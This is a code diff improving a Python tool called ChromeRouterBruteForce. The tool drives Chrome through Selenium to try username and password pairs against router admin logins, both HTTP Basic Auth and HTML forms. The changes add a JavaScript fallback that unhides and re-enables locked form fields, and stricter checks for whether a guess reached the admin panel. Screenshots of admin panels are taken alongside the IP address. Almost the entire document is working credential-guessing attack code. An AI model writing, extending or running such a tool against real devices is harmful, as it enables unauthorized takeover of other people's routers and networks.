@@ -453,15 +453,58 @@ class ChromeRouterBruteForce:
             return 'form_based'
     
     def handle_http_basic_auth(self, driver, url, username, password):
-        """Handle HTTP Basic Authentication"""
+        """Handle HTTP Basic Authentication with proper validation"""
         try:
             # For HTTP Basic Auth, we need to include credentials in URL
             from urllib.parse import urlparse
             parsed_url = urlparse(url)
             auth_url = f"{parsed_url.scheme}://{username}:{password}@{parsed_url.netloc}{parsed_url.path}"
+            
+            print(f"{Colors.BLUE}[*] Trying HTTP Basic Auth: {auth_url}{Colors.END}")
             driver.get(auth_url)
-            time.sleep(3)
-            return True, driver.current_url
+            time.sleep(5)  # Wait longer for page to load
+            
+            # Check if we got an error page
+            current_url = driver.current_url
+            page_source = driver.page_source.lower()
+            page_title = driver.title.lower()
+            
+            # Check for error indicators
+            error_indicators = [
+                'this site can\'t be reached', 'site can\'t be reached', 'can\'t be reached',
+                'this page isn\'t working', 'page isn\'t working', 'isn\'t working',
+                'connection refused', 'connection timed out', 'timeout',
+                '404 not found', '403 forbidden', '500 internal server error',
+                'server not found', 'dns_probe_finished_nxdomain',
+                'err_connection_refused', 'err_connection_timed_out',
+                'err_name_not_resolved', 'err_internet_disconnected'
+            ]
+            
+            if any(error in page_source for error in error_indicators):
+                print(f"{Colors.YELLOW}[-] HTTP Basic Auth failed - error page detected{Colors.END}")
+                return False, None
+            
+            # Check if we're still on login page (bad sign)
+            if 'login' in current_url.lower() or 'auth' in current_url.lower():
+                print(f"{Colors.YELLOW}[-] HTTP Basic Auth failed - still on login page{Colors.END}")
+                return False, None
+            
+            # Check for success indicators
+            success_indicators = [
+                'dashboard', 'admin', 'control panel', 'configuration', 'settings',
+                'system', 'status', 'network', 'router', 'gateway', 'modem',
+                'welcome', 'main menu', 'logout', 'log out', 'management'
+            ]
+            
+            success_count = sum(1 for indicator in success_indicators if indicator in page_source)
+            
+            if success_count >= 2:
+                print(f"{Colors.GREEN}[+] HTTP Basic Auth successful - found {success_count} success indicators{Colors.END}")
+                return True, current_url
+            else:
+                print(f"{Colors.YELLOW}[-] HTTP Basic Auth failed - insufficient success indicators{Colors.END}")
+                return False, None
+                
         except Exception as e:
             print(f"{Colors.YELLOW}[-] HTTP Basic Auth failed: {e}{Colors.END}")
             return False, None
@@ -475,18 +518,84 @@ class ChromeRouterBruteForce:
             if not username_field or not password_field:
                 return False, None
             
-            # Fill login form
+            # Fill login form with better error handling
             try:
-                username_field.clear()
+                # Scroll to element first
+                driver.execute_script("arguments[0].scrollIntoView(true);", username_field)
+                time.sleep(0.5)
+                
+                # Try to click and clear
+                try:
+                    username_field.click()
+                    username_field.clear()
+                except:
+                    # If click fails, try JavaScript
+                    driver.execute_script("arguments[0].click(); arguments[0].value = '';", username_field)
+                
+                # Type username
                 username_field.send_keys(username)
                 time.sleep(0.5)
                 
-                password_field.clear()
+                # Scroll to password field
+                driver.execute_script("arguments[0].scrollIntoView(true);", password_field)
+                time.sleep(0.5)
+                
+                # Try to click and clear password field
+                try:
+                    password_field.click()
+                    password_field.clear()
+                except:
+                    # If click fails, try JavaScript
+                    driver.execute_script("arguments[0].click(); arguments[0].value = '';", password_field)
+                
+                # Type password
                 password_field.send_keys(password)
                 time.sleep(0.5)
+                
             except Exception as e:
                 print(f"{Colors.YELLOW}[-] Error filling form fields: {e}{Colors.END}")
-                return False, None
+                # Try JavaScript approach as fallback
+                try:
+                    script = f"""
+                    var usernameField = arguments[0];
+                    var passwordField = arguments[1];
+                    var username = '{username}';
+                    var password = '{password}';
+                    
+                    // Make elements interactable
+                    usernameField.style.display = 'block';
+                    usernameField.style.visibility = 'visible';
+                    usernameField.removeAttribute('disabled');
+                    usernameField.removeAttribute('readonly');
+                    
+                    passwordField.style.display = 'block';
+                    passwordField.style.visibility = 'visible';
+                    passwordField.removeAttribute('disabled');
+                    passwordField.removeAttribute('readonly');
+                    
+                    // Set values
+                    usernameField.value = username;
+                    passwordField.value = password;
+                    
+                    // Trigger events
+                    usernameField.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                    usernameField.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                    passwordField.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                    passwordField.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                    
+                    return true;
+                    """
+                    
+                    result = driver.execute_script(script, username_field, password_field)
+                    if result:
+                        print(f"{Colors.BLUE}[*] Used JavaScript fallback for form filling{Colors.END}")
+                        time.sleep(1)
+                    else:
+                        return False, None
+                        
+                except Exception as js_error:
+                    print(f"{Colors.YELLOW}[-] JavaScript fallback also failed: {js_error}{Colors.END}")
+                    return False, None
             
             # Find and click submit button
             try:
@@ -561,45 +670,79 @@ class ChromeRouterBruteForce:
             return False, None
     
     def is_login_successful(self, driver, initial_url, initial_title):
-        """Check if login was successful"""
+        """Check if login was successful with strict validation"""
         try:
             current_url = driver.current_url
             current_title = driver.title
             page_source = driver.page_source.lower()
             
-            # Check for success indicators
-            success_indicators = [
-                'dashboard', 'admin', 'control panel', 'configuration', 'settings',
+            # Check for error pages first
+            error_indicators = [
+                'this site can\'t be reached', 'site can\'t be reached', 'can\'t be reached',
+                'this page isn\'t working', 'page isn\'t working', 'isn\'t working',
+                'connection refused', 'connection timed out', 'timeout',
+                '404 not found', '403 forbidden', '500 internal server error',
+                'server not found', 'dns_probe_finished_nxdomain',
+                'err_connection_refused', 'err_connection_timed_out',
+                'err_name_not_resolved', 'err_internet_disconnected'
+            ]
+            
+            # If we're on an error page, login failed
+            if any(error in page_source for error in error_indicators):
+                print(f"{Colors.YELLOW}[-] Error page detected: {current_title}{Colors.END}")
+                return False, None
+            
+            # Check if we're still on login page (bad sign)
+            login_page_indicators = [
+                'login', 'signin', 'sign-in', 'sign_in', 'auth', 'authentication',
+                'username', 'password', 'enter credentials', 'please login',
+                'login failed', 'incorrect username', 'incorrect password'
+            ]
+            
+            still_on_login = any(login_word in current_url.lower() for login_word in login_page_indicators)
+            still_on_login_page = any(login_word in page_source for login_word in login_page_indicators)
+            
+            if still_on_login or still_on_login_page:
+                print(f"{Colors.YELLOW}[-] Still on login page: {current_url}{Colors.END}")
+                return False, None
+            
+            # Check for strong success indicators
+            strong_success_indicators = [
+                'dashboard', 'admin panel', 'control panel', 'configuration',
+                'router management', 'device management', 'network management',
+                'system status', 'wan status', 'lan status', 'wireless status',
+                'firmware', 'system information', 'device information',
+                'logout', 'log out', 'sign out', 'exit'
+            ]
+            
+            # Check for admin panel specific elements
+            admin_elements = [
                 'system', 'status', 'network', 'router', 'gateway', 'modem',
-                'welcome', 'main menu', 'logout', 'log out', 'management',
-                'device status', 'system information', 'firmware', 'wan', 'lan'
+                'wireless', 'wifi', 'lan', 'wan', 'dhcp', 'nat', 'firewall',
+                'port forwarding', 'qos', 'bandwidth', 'traffic', 'logs',
+                'maintenance', 'backup', 'restore', 'upgrade', 'reboot'
             ]
             
-            # Check for failure indicators
-            failure_indicators = [
-                'invalid', 'incorrect', 'failed', 'error', 'denied', 'wrong',
-                'login failed', 'authentication failed', 'access denied',
-                'username', 'password', 'enter credentials', 'sign in',
-                'login', 'authentication', 'please login'
-            ]
+            strong_success_count = sum(1 for indicator in strong_success_indicators if indicator in page_source)
+            admin_elements_count = sum(1 for indicator in admin_elements if indicator in page_source)
             
-            success_count = sum(1 for indicator in success_indicators if indicator in page_source)
-            failure_count = sum(1 for indicator in failure_indicators if indicator in page_source)
-            
-            # Check if URL changed (good sign)
+            # Check if URL changed significantly (good sign)
             url_changed = current_url != initial_url
+            url_improved = not any(login_word in current_url.lower() for login_word in ['login', 'signin', 'auth'])
             
-            # Check if we're still on login page
-            still_on_login = any(login_word in current_url.lower() for login_word in ['login', 'signin', 'auth', 'authentication'])
+            # Check for form elements (if still present, might be login page)
+            form_elements = ['<form', 'input type="password"', 'input type="text"', 'submit', 'button']
+            form_count = sum(1 for element in form_elements if element in page_source)
             
-            # Check for admin panel specific indicators
-            admin_indicators = ['admin panel', 'router management', 'device management', 'network management']
-            admin_count = sum(1 for indicator in admin_indicators if indicator in page_source)
-            
-            # Determine if login was successful
-            if (success_count > failure_count and success_count >= 2) or (url_changed and not still_on_login) or admin_count >= 1:
+            # Strict validation: Must have strong indicators AND not be on login page
+            if (strong_success_count >= 2 or admin_elements_count >= 3) and not still_on_login_page and form_count < 3:
+                print(f"{Colors.GREEN}[+] Strong success indicators found: {strong_success_count} strong, {admin_elements_count} admin{Colors.END}")
+                return True, current_url
+            elif url_changed and url_improved and not still_on_login_page and form_count < 2:
+                print(f"{Colors.GREEN}[+] URL changed to admin area: {current_url}{Colors.END}")
                 return True, current_url
             else:
+                print(f"{Colors.YELLOW}[-] Insufficient success indicators: strong={strong_success_count}, admin={admin_elements_count}, forms={form_count}{Colors.END}")
                 return False, None
                 
         except Exception as e:
@@ -609,6 +752,7 @@ class ChromeRouterBruteForce:
     def test_credentials_with_chrome(self, url, username, password):
         """Test credentials using Chrome automation with multiple auth types"""
         driver = None
+        success = False
         try:
             print(f"{Colors.CYAN}[>] Testing: {username}:{password}{Colors.END}")
             
@@ -617,20 +761,42 @@ class ChromeRouterBruteForce:
             if not driver:
                 return False, None, None
             
+            # Set page load timeout
+            driver.set_page_load_timeout(30)
+            
             # Navigate to URL
-            driver.get(url)
-            time.sleep(3)  # Wait for page to load
+            try:
+                driver.get(url)
+                time.sleep(3)  # Wait for page to load
+            except Exception as e:
+                print(f"{Colors.YELLOW}[-] Page load timeout or error: {e}{Colors.END}")
+                return False, None, None
             
             # Get initial page info
             initial_url = driver.current_url
             initial_title = driver.title
+            
+            # Check for error pages first
+            page_source = driver.page_source.lower()
+            error_indicators = [
+                'this site can\'t be reached', 'site can\'t be reached', 'can\'t be reached',
+                'this page isn\'t working', 'page isn\'t working', 'isn\'t working',
+                'connection refused', 'connection timed out', 'timeout',
+                '404 not found', '403 forbidden', '500 internal server error',
+                'server not found', 'dns_probe_finished_nxdomain',
+                'err_connection_refused', 'err_connection_timed_out',
+                'err_name_not_resolved', 'err_internet_disconnected'
+            ]
+            
+            if any(error in page_source for error in error_indicators):
+                print(f"{Colors.YELLOW}[-] Error page detected: {initial_title}{Colors.END}")
+                return False, None, None
             
             # Detect authentication type
             auth_type = self.detect_authentication_type(driver, url)
             print(f"{Colors.BLUE}[*] Detected auth type: {auth_type}{Colors.END}")
             
             # Handle different authentication types
-            success = False
             final_url = None
             
             if auth_type == 'http_basic':
@@ -661,7 +827,10 @@ class ChromeRouterBruteForce:
             return False, None, None
         finally:
             if driver and not success:
-                driver.quit()
+                try:
+                    driver.quit()
+                except:
+                    pass
     
     def take_screenshot(self, driver, url, username, password, ip_address):
         """Take screenshot of admin panel"""
